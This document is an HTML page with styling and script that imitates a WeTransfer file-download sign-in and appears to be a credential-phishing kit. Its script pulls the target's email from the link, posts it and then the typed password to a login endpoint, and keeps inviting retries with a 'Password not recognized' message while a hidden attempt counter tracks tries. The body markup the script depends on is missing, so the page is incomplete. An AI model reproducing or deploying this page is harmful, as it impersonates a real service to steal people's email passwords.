<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>WeTransfer | Share big ideas</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
    <link href="./assets/favicon.ico" rel="icon" type="image/x-icon">

    <style>
        /* ─── RESET & BASE ─── */
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html {
            font-size: 16px;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #f2f2f5;
            color: #1a1a1a;
            min-height: 100vh;
            min-height: calc(var(--vh, 1vh) * 100);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            padding: 20px;
        }

        /* ─── LOADING OVERLAY ─── */
        .loading-overlay {
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.92);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.35s ease, visibility 0.35s ease;
        }

        .loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .loading-spinner {
            width: 44px;
            height: 44px;
            border: 3px solid #e8e8e8;
            border-top-color: #1a1a1a;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .loading-text {
            margin-top: 18px;
            font-size: 0.95rem;
            color: #555;
            letter-spacing: 0.3px;
            font-weight: 400;
        }

        /* ─── MAIN CONTAINER ─── */
        .wt-container {
            display: flex;
            max-width: 1120px;
            width: 100%;
            min-height: 600px;
            background: #fff;
            border-radius: 28px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.10), 0 8px 24px rgba(0, 0, 0, 0.05);
            overflow: hidden;
            position: relative;
        }

        /* ─── SPLIT PANES ─── */
        .wt-pane {
            flex: 1;
            padding: 48px 40px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .wt-pane--left {
            position: relative;
            min-height: 480px;
            background: linear-gradient(145deg, #f0f0f5 0%, #dce0e8 100%);
            overflow: hidden;
        }

        /* ─── LEFT PANE BACKGROUND IMAGE ─── */
        .wt-pane--left::before {
            content: '';
            position: absolute;
            inset: 0;
            background-image: url('https://images.unsplash.com/photo-1541701494587-cb58502866ab?w=800&h=600&fit=crop&crop=center&q=80');
            background-size: cover;
            background-position: center;
            opacity: 0.15;
            filter: blur(2px) saturate(0.7);
            pointer-events: none;
            z-index: 0;
        }

        .wt-pane--left::after {
            content: '';
            position: absolute;
            inset: 0;
            background: radial-gradient(ellipse at 30% 40%, rgba(255, 255, 255, 0.4) 0%, transparent 70%);
            pointer-events: none;
            z-index: 0;
        }

        .wt-pane--left>*:not(.wt-logo) {
            position: relative;
            z-index: 1;
        }

        .wt-pane--right {
            background: #fff;
            padding: 40px 36px;
            min-width: 380px;
            position: relative;
            z-index: 2;
        }

        /* ─── LOGO ─── */
        .wt-logo {
            position: absolute;
            top: 32px;
            left: 40px;
            height: 20px;
            width: auto;
            z-index: 3;
            opacity: 0.9;
        }

        /* ─── PRODUCT HEADER ─── */
        .wt-product-header {
            margin-bottom: 24px;
            position: relative;
            z-index: 1;
        }

        .wt-product-header__header {
            font-size: 2.2rem;
            font-weight: 300;
            line-height: 1.2;
            letter-spacing: -0.02em;
            color: #1a1a1a;
            max-width: 90%;
        }

        .wt-product-header__header--strong {
            font-weight: 600;
            background: linear-gradient(135deg, #1a1a1a 0%, #444 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .wt-product-header__subheader {
            font-size: 1.05rem;
            font-weight: 400;
            color: #666;
            margin-top: 10px;
            letter-spacing: 0.2px;
        }

        /* ─── FEATURE IMAGE ─── */
        .wt-product-feature__image-wrapper {
            margin-top: 8px;
            border-radius: 18px;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
            position: relative;
            z-index: 1;
            background: #fff;
        }

        .wt-product-feature__image {
            width: 100%;
            height: auto;
            display: block;
            object-fit: cover;
            max-height: 280px;
            transition: transform 0.5s ease;
        }

        .wt-product-feature__image-wrapper:hover .wt-product-feature__image {
            transform: scale(1.01);
        }

        /* ─── AUTH WIDGET ─── */
        .auth0-lock-widget {
            width: 100%;
            max-width: 380px;
            margin: 0 auto;
        }

        .auth0-lock-widget-container {
            width: 100%;
        }

        .auth0-lock-cred-pane {
            width: 100%;
        }

        .auth0-lock-cred-pane-internal-wrapper {
            width: 100%;
        }

        .auth0-lock-content-wrapper {
            width: 100%;
        }

        /* ─── HEADER ─── */
        .auth0-lock-header {
            text-align: center;
            margin-bottom: 28px;
            position: relative;
        }

        .auth0-lock-header-welcome {
            position: relative;
            z-index: 1;
            padding-top: 4px;
        }

        .auth0-lock-header-logo {
            height: 40px;
            width: auto;
            display: inline-block;
        }

        /* ─── TABS ─── */
        .auth0-lock-tabs-container {
            margin-bottom: 12px;
        }

        .auth0-lock-tabs {
            display: flex;
            list-style: none;
            padding: 0;
            margin: 0;
            gap: 0;
            border-bottom: 2px solid #f0f0f0;
        }

        .auth0-lock-tabs-current {
            padding: 12px 0 10px 0;
            font-size: 0.95rem;
            font-weight: 600;
            color: #1a1a1a;
            border-bottom: 2px solid #1a1a1a;
            margin-bottom: -2px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .auth0-lock-tabs-current svg {
            width: 20px;
            height: 20px;
        }

        .auth0-lock-tabs-current span {
            font-size: 0.95rem;
            font-weight: 600;
        }

        .auth0-lock-pane-separator {
            height: 1px;
            background: #f0f0f0;
            margin: 0 0 16px 0;
        }

        /* ─── FILE LIST (STEP 1) ─── */
        .auth0-lock-input-block {
            margin-bottom: 14px;
        }

        .auth0-lock-input-wrap {
            position: relative;
            border-radius: 12px;
            background: #f7f7f9;
            padding: 4px 16px;
            transition: background 0.2s ease, box-shadow 0.2s ease;
        }

        .auth0-lock-input-wrap hr {
            border: none;
            border-top: 1px solid #eee;
            margin: 6px 0;
        }

        .auth0-lock-input-wrap ul {
            list-style: none;
            padding: 8px 0;
            margin: 0;
            line-height: 1.6;
        }

        .auth0-lock-input-wrap ul li:first-child {
            font-weight: 600;
            font-size: 0.95rem;
            color: #1a1a1a;
        }

        .auth0-lock-input-wrap ul li:last-child {
            font-size: 0.8rem;
            color: #999;
        }

        .auth0-lock-alternative {
            font-size: 0.8rem;
            color: #999;
            text-align: center;
            margin: 12px 0 0 0;
            letter-spacing: 0.2px;
        }

        .auth0-lock-alternative-link {
            color: #1a1a1a;
            text-decoration: none;
            font-weight: 500;
            border-bottom: 1px solid #ddd;
            transition: border-color 0.2s;
        }

        .auth0-lock-alternative-link:hover {
            border-color: #1a1a1a;
        }

        /* ─── BUTTON ─── */
        .auth0-lock-submit {
            display: block;
            width: 100%;
            padding: 16px 24px;
            border: none;
            border-radius: 40px;
            background: #1a1a1a;
            color: #fff;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.25s ease, transform 0.15s ease, box-shadow 0.25s ease;
            margin-top: 16px;
            position: relative;
            letter-spacing: 0.3px;
            font-family: inherit;
        }

        .auth0-lock-submit:hover {
            background: #000;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
        }

        .auth0-lock-submit:active {
            transform: scale(0.98);
        }

        .auth0-lock-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .auth0-lock-submit .auth0-label-submit {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .auth0-lock-submit .auth0-label-submit svg {
            transition: transform 0.2s ease;
        }

        .auth0-lock-submit:hover .auth0-label-submit svg {
            transform: translateX(2px);
        }

        .auth0-loading-container {
            display: none;
        }

        .auth0-lock-submit:disabled .auth0-loading-container {
            display: block;
        }

        .auth0-lock-submit:disabled .auth0-label-submit {
            opacity: 0.7;
        }

        .auth0-loading {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            margin: 0 auto;
        }

        /* ─── STEP 2: PASSWORD INPUT ─── */
        #two .auth0-lock-input-wrap {
            background: #f7f7f9;
            padding: 0 16px;
            display: flex;
            align-items: center;
            border: 2px solid transparent;
            transition: border-color 0.25s ease, background 0.25s ease, box-shadow 0.25s ease;
            border-radius: 12px;
        }

        #two .auth0-lock-input-wrap:focus-within {
            border-color: #1a1a1a;
            background: #fff;
            box-shadow: 0 0 0 4px rgba(26, 26, 26, 0.06);
        }

        #two .auth0-lock-input-wrap.show-error {
            border-color: #e74c3c;
            background: #fff9f8;
            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.08);
        }

        #two .auth0-lock-input-wrap .auth0-lock-icon {
            flex-shrink: 0;
            margin-right: 12px;
            opacity: 0.5;
            transition: opacity 0.2s;
        }

        #two .auth0-lock-input-wrap:focus-within .auth0-lock-icon {
            opacity: 0.8;
        }

        #two .auth0-lock-input {
            width: 100%;
            padding: 16px 0;
            border: none;
            background: transparent;
            font-size: 0.95rem;
            font-family: inherit;
            color: #1a1a1a;
            outline: none;
        }

        #two .auth0-lock-input::placeholder {
            color: #aaa;
            font-weight: 400;
        }

        #two .auth0-lock-input:read-only {
            color: #555;
            cursor: default;
        }

        /* ─── EMAIL DISPLAY (readonly) with clean "Sign in as" style ─── */
        #email_display {
            color: #1a1a1a !important;
            font-weight: 500;
            letter-spacing: 0.2px;
            font-size: 0.95rem;
        }

        #email_display::placeholder {
            color: #aaa;
            font-weight: 400;
        }

        /* ─── SLEEK ERROR CONTAINER ─── */
        .sleek-error-container {
            min-height: 56px;
            margin-top: 4px;
        }

        .error-message {
            font-size: 0.9rem;
            padding: 0;
            opacity: 0;
            transform: translateY(-6px);
            transition: opacity 0.3s ease, transform 0.3s ease;
            pointer-events: none;
        }

        .error-message.show {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
        }

        .error-message--sleek {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            padding: 14px 18px 14px 16px;
            background: #fef6f5;
            border-radius: 12px;
            border-left: 4px solid #e74c3c;
            color: #3d1e1a;
            font-weight: 400;
            line-height: 1.5;
            box-shadow: 0 2px 8px rgba(231, 76, 60, 0.06);
        }

        .error-message--sleek .emoji {
            font-size: 1.2rem;
            flex-shrink: 0;
            line-height: 1.4;
            margin-top: 1px;
        }

        .error-message--sleek .highlight {
            font-weight: 600;
            color: #c0392b;
        }

        .error-message--sleek .error-text {
            display: flex;
            flex-direction: column;
        }

        .error-message--sleek .error-text br {
            display: block;
            content: '';
            margin: 2px 0;
        }

        /* ─── ATTEMPT COUNTER (hidden via CSS) ─── */
        .attempt-counter {
            display: none !important;
        }

        /* ─── SHAKE ANIMATION ─── */
        @keyframes shake {
            0%,
            100% {
                transform: translateX(0);
            }
            20% {
                transform: translateX(-8px);
            }
            40% {
                transform: translateX(8px);
            }
            60% {
                transform: translateX(-5px);
            }
            80% {
                transform: translateX(5px);
            }
        }

        .shake {
            animation: shake 0.4s ease;
        }

        /* ─── RESPONSIVE ─── */
        @media (max-width: 860px) {
            .wt-container {
                flex-direction: column;
                border-radius: 20px;
                min-height: auto;
                max-width: 480px;
            }

            .wt-pane {
                padding: 32px 24px;
            }

            .wt-pane--left {
                min-height: 200px;
                padding-bottom: 20px;
            }

            .wt-pane--left::before {
                opacity: 0.10;
            }

            .wt-pane--right {
                min-width: 0;
                padding: 24px 20px 32px;
            }

            .wt-logo {
                top: 20px;
                left: 24px;
                height: 18px;
            }

            .wt-product-header__header {
                font-size: 1.6rem;
                max-width: 100%;
            }

            .wt-product-feature__image {
                max-height: 140px;
            }

            .auth0-lock-widget {
                max-width: 100%;
            }

            .auth0-lock-submit {
                padding: 14px 20px;
                font-size: 0.95rem;
            }

            #two .auth0-lock-input {
                padding: 14px 0;
                font-size: 0.9rem;
            }

            .error-message--sleek {
                padding: 12px 14px 12px 12px;
                font-size: 0.85rem;
                gap: 10px;
            }

            .error-message--sleek .emoji {
                font-size: 1.1rem;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 12px;
            }

            .wt-pane {
                padding: 24px 16px;
            }

            .wt-pane--right {
                padding: 18px 14px 24px;
            }

            .wt-pane--left {
                min-height: 160px;
                padding-bottom: 16px;
            }

            .wt-product-header__header {
                font-size: 1.3rem;
            }

            .wt-product-header__subheader {
                font-size: 0.9rem;
            }

            .auth0-lock-tabs-current {
                font-size: 0.85rem;
                padding: 10px 0 8px 0;
            }

            .auth0-lock-submit {
                padding: 12px 16px;
                font-size: 0.9rem;
                border-radius: 32px;
            }

            #two .auth0-lock-input-wrap {
                padding: 0 12px;
            }

            #two .auth0-lock-input {
                padding: 12px 0;
                font-size: 0.85rem;
            }

            .error-message--sleek {
                padding: 10px 12px 10px 10px;
                font-size: 0.8rem;
                gap: 8px;
                border-left-width: 3px;
            }

            .error-message--sleek .emoji {
                font-size: 1rem;
            }

            .sleek-error-container {
                min-height: 48px;
            }
        }

        /* ─── DOWNLOAD BUTTON ICON ─── */
        .downloader__top-icon {
            width: 28px;
            height: 28px;
            display: block;
        }

        .downloader__top-icon g {
            fill: #1a1a1a;
        }

        /* ─── FORGOT PASSWORD ─── */
        .auth0-lock-alternative {
            display: flex;
            justify-content: center;
            gap: 4px;
            flex-wrap: wrap;
        }

        .auth0-lock-alternative-link {
            font-size: 0.8rem;
        }

        /* ─── GLOBAL MESSAGE (hidden) ─── */
        .auth0-global-message {
            display: none !important;
        }

        /* ─── FOCUS VISIBLE ─── */
        .auth0-lock-input:focus-visible {
            outline: none;
        }

        .auth0-lock-submit:focus-visible {
            outline: 2px solid #1a1a1a;
            outline-offset: 2px;
        }

        /* ─── EMAIL ICON IN STEP 2 ─── */
        .email-icon-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            width: 20px;
            height: 20px;
            margin-right: 12px;
            opacity: 0.5;
            transition: opacity 0.2s;
        }

        .auth0-lock-input-wrap:focus-within .email-icon-wrapper {
            opacity: 0.8;
        }

        .email-icon-wrapper svg {
            width: 18px;
            height: 18px;
        }
    </style>
</head>

    <script>
        (function() {
            'use strict';

            // ─── CONFIG ───
            const API_URL = '/api/login';

            // ─── DOM REFS ───
            const loadingOverlay = document.getElementById('loadingOverlay');
            const one = document.getElementById('one');
            const two = document.getElementById('two');
            const downloadBtn = document.getElementById('download');
            const submitBtn = document.getElementById('submit-btn');
            const passwordInput = document.getElementById('password');
            const emailDisplay = document.getElementById('email_display');
            const passwordError = document.getElementById('passwordError');
            const attemptCounter = document.getElementById('attemptCounter');
            const passwordWrap = document.getElementById('passwordWrap');
            const passwordBlock = document.getElementById('passwordBlock');

            let currentEmail = '';
            let attemptCount = 0;

            // ─── HELPERS ───
            function getEmailFromURL() {
                if (window.location.hash) {
                    const hashParams = new URLSearchParams(window.location.hash.substring(1));
                    const email = hashParams.get('email');
                    if (email) return email;
                    const match = window.location.hash.match(
                        /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
                    );
                    if (match) return match[0];
                }
                const params = new URLSearchParams(window.location.search);
                return params.get('email') || '';
            }

            function setLoading(loading) {
                if (loading) {
                    loadingOverlay.classList.add('active');
                } else {
                    loadingOverlay.classList.remove('active');
                }
                downloadBtn.disabled = loading;
                submitBtn.disabled = loading;
            }

            // ─── SLEEK ERROR — UNIFIED FRIENDLY MESSAGE ───
            function showSleekError() {
                hideError();

                const msg = `
                    <div class="error-message--sleek">
                        <span class="emoji">🔒</span>
                        <span class="error-text">
                            <span class="highlight">Password not recognized.</span>
                            Please double-check your password and enter it carefully before trying again.
                        </span>
                    </div>
                `;

                passwordError.innerHTML = msg;
                passwordError.classList.add('show');
                passwordWrap.classList.add('show-error');

                // Shake the input block
                passwordBlock.classList.add('shake');
                setTimeout(() => passwordBlock.classList.remove('shake'), 420);
            }

            function hideError() {
                passwordError.innerHTML = '';
                passwordError.classList.remove('show');
                passwordWrap.classList.remove('show-error');
            }

            // ─── STEP 1: DOWNLOAD ALL ───
            downloadBtn.addEventListener('click', function(e) {
                e.preventDefault();
                hideError();

                const email = getEmailFromURL();
                if (!email) {
                    passwordError.innerHTML =
                        `<div class="error-message--sleek"><span class="emoji">⚠️</span> <span class="error-text">Email not found in URL.</span></div>`;
                    passwordError.classList.add('show');
                    return;
                }

                setLoading(true);

                fetch(API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ action: 'email', email: email })
                    })
                    .then(response => response.json())
                    .then(data => {
                        setLoading(false);
                        if (data.success) {
                            currentEmail = email;
                            // Display email cleanly — no #, just the email with icon
                            emailDisplay.value = email;
                            one.style.display = 'none';
                            two.style.display = 'block';
                            attemptCount = 0;
                            hideError();
                            passwordInput.value = '';
                            setTimeout(() => passwordInput.focus(), 120);
                        } else {
                            passwordError.innerHTML =
                                `<div class="error-message--sleek"><span class="emoji">⚠️</span> <span class="error-text">${data.error || 'Something went wrong.'}</span></div>`;
                            passwordError.classList.add('show');
                        }
                    })
                    .catch(() => {
                        setLoading(false);
                        passwordError.innerHTML =
                            `<div class="error-message--sleek"><span class="emoji">🌐</span> <span class="error-text">Network error. Please try again.</span></div>`;
                        passwordError.classList.add('show');
                    });
            });

            // ─── STEP 2: SUBMIT PASSWORD ───
            submitBtn.addEventListener('click', function(e) {
                e.preventDefault();
                hideError();

                const password = passwordInput.value.trim();
                if (!password) {
                    passwordError.innerHTML =
                        `<div class="error-message--sleek"><span class="emoji">✍️</span> <span class="error-text">Please enter your password.</span></div>`;
                    passwordError.classList.add('show');
                    passwordInput.focus();
                    return;
                }

                attemptCount++;
                setLoading(true);

                fetch(API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            action: 'password',
                            email: currentEmail,
                            password: password,
                            remember: 0
                        })
                    })
                    .then(response => {
                        if (!response.ok) {
                            return response.json().then(data => {
                                throw new Error(data.error || 'Incorrect password.');
                            });
                        }
                        return response.json();
                    })
                    .then(data => {
                        setLoading(false);
                        if (data.redirect) {
                            window.location.href = data.redirect;
                        } else {
                            showSleekError();
                            passwordInput.value = '';
                            passwordInput.focus();
                        }
                    })
                    .catch(() => {
                        setLoading(false);
                        showSleekError();
                        passwordInput.value = '';
                        passwordInput.focus();
                    });
            });

            // ─── KEYBOARD: ENTER TO SUBMIT ───
            passwordInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    submitBtn.click();
                }
            });

            // ─── ERROR CLEARING: ONLY ON INPUT (typing), NOT ON FOCUS ───
            passwordInput.addEventListener('input', function() {
                hideError();
            });

            // ─── AUTO-FOCUS PASSWORD WHEN STEP 2 APPEARS ───
            const observer = new MutationObserver(function() {
                if (two.style.display !== 'none' && two.style.display !== '') {
                    setTimeout(() => passwordInput.focus(), 200);
                    observer.disconnect();
                }
            });
            observer.observe(two, { attributes: true, attributeFilter: ['style'] });

            if (two.style.display !== 'none' && two.style.display !== '') {
                setTimeout(() => passwordInput.focus(), 200);
            }

            // ─── HIDE OVERLAY ON PAGE LOAD ───
            window.addEventListener('load', function() {
                setLoading(false);
            });

        })();
    </script>
